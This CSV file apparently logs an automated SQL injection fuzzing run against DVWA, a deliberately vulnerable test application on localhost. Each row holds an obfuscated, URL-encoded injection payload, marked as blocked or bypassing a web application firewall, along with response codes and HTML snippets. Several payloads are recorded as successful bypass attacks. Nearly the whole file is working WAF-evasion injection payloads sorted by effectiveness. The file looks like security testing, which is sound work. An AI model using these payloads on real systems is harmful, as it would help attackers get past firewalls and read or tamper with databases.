Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'<@=.1+||+not+{a%0b1}=1=+(!+{x%0b(select+1)}=1)%0b||%27,Bypassed,No,None,Invalid,0.0221,74.09,No,500,
0%27<@=.1%0bor+not+{x%0b(select+1)}=1=+(not%0b{x+(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0237,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1+or+not+{x+(select+1)}=1=%0b(!+{`if`+1}=1)+or%27,Blocked,No,None,Invalid,0.0301,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+||+not+1=%0b(not%0btrue)+or',Bypassed,No,None,Invalid,0.0431,74.09,No,500,
0'||+@<@.+||%0bnot+{`if`+1}=1=+(!%0b{x%0b(select+1)}=1)+or%27,Bypassed,No,None,Invalid,0.0336,74.09,No,500,
0'<@=.1+or+not+{x%0b(select+1)}=1=+(not%0b{x%0b(select+1)}=1)+||',Bypassed,No,None,Invalid,0.0294,74.09,No,500,
0'<@=1.%0bor+not%0b{`if`%0b1}=1=+(not+{a+1}=1)--+,Bypassed,No,None,Invalid,0.0314,74.09,No,500,
0'<@!=1%0b||%0bnot+{a+1}=1=+(not+{`if`%0b1}=1)+||%27,Bypassed,No,None,Invalid,0.0312,74.09,No,500,
0'<@!=1.%0bor+!%0b{x+(select+1)}=1=%0b(!%0b{a%0b1}=1)%0bor%27,Bypassed,No,None,Invalid,0.0197,74.09,No,500,
0'<@=.1%0bor+!+1=+(not%0b{a+1}=1)+||',Bypassed,No,None,Invalid,0.0365,74.09,No,500,
0%27<@!=1.%0bor%0bnot%0b{a+1}=1=+(not%0b{x+(select+1)}=1)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0274,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||%0b!%0b{`if`%0b1}=1=+(not+{x+(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0132,74.09,No,500,
0'<@=1%0bor+!%0b{x+(select%0b1)}=1=+(not%0b{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0249,74.09,No,500,
0'<@=1.%0b||+!%0b{`if`+1}=1=+(!~false)+or',Bypassed,No,None,Invalid,0.0309,74.09,No,500,
0'<@!=.1+||+not%0b{a%0b1}=1=%0b(!%0b1)+or',Bypassed,No,None,Invalid,0.0286,74.09,No,500,
0%27<@!=1.%0bor+!+{a+1}=1=+(not%0b{x%0b(select%0b1)}=1)%0b||',Bypassed,No,None,Invalid,0.0812,74.09,No,500,
0%27<@=1.+||+not~false=%0b(!+{`if`%0b1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0295,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or%0bfalse=+(!+{`if`%0b1}=1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0324,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+!+{`if`%0b1}=1=%0b(!%7efalse)+||',Bypassed,No,None,Invalid,0.0396,74.09,No,500,
0'<@!=1+||+false%0bis+false%0bor%27,Bypassed,No,None,Invalid,0.0356,74.09,No,500,
0%27<@!=.1+or%0bnot+1=%0b(!%0b{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0466,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor+not%0b{`if`+1}=1=+(!%7efalse)--+,Bypassed,No,None,Invalid,0.0528,74.09,No,500,
0%27<@=1%0bor+!%0b{x%0b(select+1)}=1=%0b(not%0b{`if`+1}=1)%0bor',Bypassed,No,None,Invalid,0.0311,74.09,No,500,
0'<@!=1+||+!%0b{x+(select+1)}=1=%0b(not%7efalse)+or%27,Bypassed,No,None,Invalid,0.0227,74.09,No,500,
0%27<@!=.1%0b||+!~false=%0b(not+{x%0b(select+1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0322,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||+!+{`if`+1}=1=%0b(not+{`if`%0b1}=1)%0bor%27,Bypassed,No,None,Invalid,0.018,74.09,No,500,
0%27<@!=.1%0b||%0bnot%0b{`if`%0b1}=1=%0b(not+1)%23,Bypassed,Yes,Yes (unionAtk),Invalid,0.0098,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||%0bnot%0b{a+1}=1=+(!+{`if`+1}=1)+||',Bypassed,No,None,Invalid,0.015,74.09,No,500,
0'<@!=1+||+not%0b{x+(select+1)}=1=%0b(not%0b{`if`+1}=1)--+,Bypassed,No,None,Invalid,0.0275,74.09,No,500,
0%27<@!=1%0b||+not%0b{`if`+1}=1=+(not%0b{x+(select%0b1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.013,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+||%0b!+{x%0b(select+1)}=1=+(!%0b{x+(select%0b1)}=1)+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0299,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0bor+not%0b{x%0b(select%0b1)}=1=+(!%0btrue)--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0472,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.+or+not%0b{x+(select%0b1)}=1=%0b(not%0b{x+(select%0b1)}=1)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0375,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.+or+!+{`if`+1}=1=+(not+{x%0b(select+1)}=1)%0bor%27,Bypassed,No,None,Invalid,0.0214,74.09,No,500,
0'<@=.1+||%0b{a%0b1}=1%0blike+{x+(select%0b1)}=1+||',Blocked,No,None,Invalid,0.0262,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@!=.1%0b||+!%0b{`if`%0b1}=1=+(not+{x+(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.027,74.09,No,500,
0%27<@=1.%0bor+not+1=+(!%0b{x%0b(select%0b1)}=1)+or',Bypassed,No,None,Invalid,0.0184,74.09,No,500,
0'<@!=1%0b||%0b!+1=+(!+{x+(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0308,74.09,No,500,
0%27<@=1.%0bor+!+{x%0b(select+1)}=1=+(not+{x%0b(select+1)}=1)+or',Bypassed,No,None,Invalid,0.0232,74.09,No,500,
0'<@=1.+or%0bnot%0b{`if`+1}=1=+(not~false)--%0b,Bypassed,No,None,Invalid,0.0298,74.09,No,500,
0%27<@!=.1%0b||+!+{x%0b(select+1)}=1=+(!%0b{x+(select%0b1)}=1)+||',Bypassed,No,None,Invalid,0.0246,74.09,No,500,
0%27<@=1+||+not%0b{a%0b1}=1=+(!+{x%0b(select%0b1)}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0197,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0b{x+(select%0b1)}=1+like%0b1--+,Bypassed,Yes,Yes (unionAtk),Invalid,0.0144,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or%0b!+{`if`+1}=1=+(!+{a+1}=1)%0b||%27,Bypassed,No,None,Invalid,0.015,74.09,No,500,
0'<@=1+or+!+{x+(select+1)}=1=%0b(not%0btrue)%23,Blocked,No,None,Invalid,0.029,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27||+1<@.%0b||+!+{a+1}=1=%0b(!+{`if`+1}=1)+||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0259,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1+||+not%0btrue=%0b(!+{`if`%0b1}=1)+or%27,Bypassed,No,None,Invalid,0.0375,74.09,No,500,
0'<@=.1%0bor+!+{`if`+1}=1=%0b(!+{`if`%0b1}=1)+||',Bypassed,No,None,Invalid,0.0691,74.09,No,500,
0%27<@!=.1%0b||+{`if`%0b1}=1%0blike+{`if`+1}=1+or%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0162,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.+||+not+{x+(select+1)}=1=+(not~0)%0bor%27,Blocked,No,None,Invalid,0.013,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0bor%0bnot+{x+(select%0b1)}=1=+(not+true)--%0b,Bypassed,Yes,Yes (unionAtk),Invalid,0.0102,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0b||+not+{`if`%0b1}=1=+(!+1)+or',Bypassed,No,None,Invalid,0.0343,74.09,No,500,
0%27<@!=1.%0bor%0b!%0b{x%0b(select+1)}=1=+(not%0b{`if`+1}=1)%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0245,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+||%0bnot%0b{x+(select+1)}=1=+(not+{`if`%0b1}=1)%0bor',Blocked,No,None,Invalid,0.0155,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1%0bor+!%0b{`if`+1}=1=%0b(!%0b{`if`+1}=1)+or',Bypassed,No,None,Invalid,0.0331,74.09,No,500,
0%27<@!=1%0bor+not%0b{x+(select+1)}=1=+(!%0b{x+(select+1)}=1)%0b||',Bypassed,No,None,Invalid,0.0337,74.09,No,500,
0%27<@=1.%0bor+{`if`%0b1}=1%0blike%0b{x+(select%0b1)}=1%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0161,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+or%0bnot%7efalse+is+false%0bor%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0352,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+!+{x+(select+1)}=1=+(not%0b{x+(select+1)}=1)%0b||',Blocked,No,None,Invalid,0.0133,74.09,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1+||+!%0b{a+1}=1=%0b(!%0b{a+1}=1)%0bor',Bypassed,No,None,Invalid,0.0589,74.09,No,500,
0'or%0b@<@.+or%0bnot%0b{`if`%0b1}=1=+(!+{x%0b(select%0b1)}=1)+or%27,Bypassed,No,None,Invalid,0.0329,74.09,No,500,
0'<@!=1.+or+not+{`if`%0b1}=1=+(not%0b{x%0b(select+1)}=1)%0bor',Bypassed,No,None,Invalid,0.0365,74.09,No,500,
0%27or%0b!@<@.%0b||%0bnot+{x%0b(select+1)}=1=%0b(not%7e0)%0b||',Bypassed,No,None,Invalid,0.037,74.09,No,500,
0%27<@!=1%0bor%0bnot+{x+(select%0b1)}=1=+(not%0b1)+or',Bypassed,No,None,Invalid,0.0127,74.09,No,500,
0'<@!=1%0b||%0b1%0blike+{a+1}=1%0b||',Bypassed,No,None,Invalid,0.0395,74.09,No,500,
0%27<@!=.1+or%0bnot%0b{`if`+1}=1=+(not+{x+(select%0b1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0515,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+!%0b{a+1}=1=%0b(not%0b{x%0b(select%0b1)}=1)%0b||%27,Bypassed,Yes,Yes (unionAtk),Invalid,0.0339,74.09,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
